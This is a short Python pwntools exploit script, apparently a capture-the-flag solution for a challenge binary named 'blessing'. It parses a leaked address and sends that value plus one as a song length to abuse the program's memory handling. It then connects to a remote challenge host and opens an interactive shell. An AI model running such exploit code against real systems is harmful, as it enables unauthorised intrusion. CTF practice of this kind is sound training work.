#!/usr/bin/python3

from pwn import *

exe = ELF("blessing_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
brva 0x00000000000016C7
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
  
def gift_leak():
    io.recvuntil(b"Please accept this: ")
    result = io.recvn(numb=14)
    int_value = int(result.strip(), base=16)
    return int_value

def song_length(length):
    io.sendlineafter(b"length: ", str(length).encode())
    
def song():
    io.sendlineafter(b"song: ", b"f")

		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.57.1:47599"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 30

gift_leak = gift_leak()
print(f"{hex(gift_leak)=}")
song_length(gift_leak+1)
song()

io.interactive()
